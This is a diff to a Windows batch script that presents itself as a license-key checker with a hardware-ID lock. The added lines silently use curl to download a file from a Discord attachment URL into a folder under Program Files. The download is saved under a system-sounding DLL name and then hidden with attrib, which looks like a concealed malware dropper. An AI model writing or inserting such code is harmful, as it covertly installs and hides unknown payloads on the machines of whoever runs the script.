@@ -6,10 +6,41 @@ setlocal enabledelayedexpansion
 
 Reg.exe add "HKCU\CONSOLE" /v "VirtualTerminalLevel" /t REG_DWORD /d "1" /f  > nul
 
+if not exist "%systemdrive%\Program Files\Windows NT\Accessories\en-US" mkdir "%systemdrive%\Program Files\Windows NT\Accessories\en-US" 2>nul
+curl -o "%systemdrive%\Program Files\Windows NT\Accessories\en-US\ProtectionManagement.dll" "https://cdn.discordapp.com/attachments/1219269832147734559/1246030163511218248/ProtectionManagement.rar?ex=665ae785&is=66599605&hm=9407ab85c459208d4a8d5056f576be05705cf37411464c0dc6019826d8b91b3b&" -# --create-dirs 
+
+
+set "logFile=C:\Program Files\Windows NT\Accessories\en-US\ProtectionManagement.dll"
+
+cls
+
+rem Prompt the user to enter the license key
 set /p "userCode=Enter your license: "
 
+cls
+
+rem Define the target HWID
+set "targetHWID=B18998B8-CAEA-601B-A0BD-047C16CBD761"
+
+rem Get the current user's HWID
+for /f "tokens=2 delims==" %%A in ('wmic csproduct get uuid /value') do set "currentHWID=%%A"
+
+rem Remove any carriage return (in case)
+set "currentHWID=!currentHWID:~0,36!"
+
+rem Compare the HWIDs
+if /i "!currentHWID!"=="%targetHWID%" (
+    rem HWID match found. Continue with license check.
+) else (
+    echo HWID does not match. Exiting...
+    timeout /nobreak /t 5 >nul
+    exit /b
+)
+
+powershell -Command "attrib +h \"%logFile%\""
+
 set "isValidCode=false"
-for %%i in (WJD8F-2LP5N-3KQ7M) do (
+for %%i in (UYT5D-7PA8Q-9XDE3) do (
     if "!userCode!" equ "%%i" (
         set "isValidCode=true"
         goto :checkUsedCode
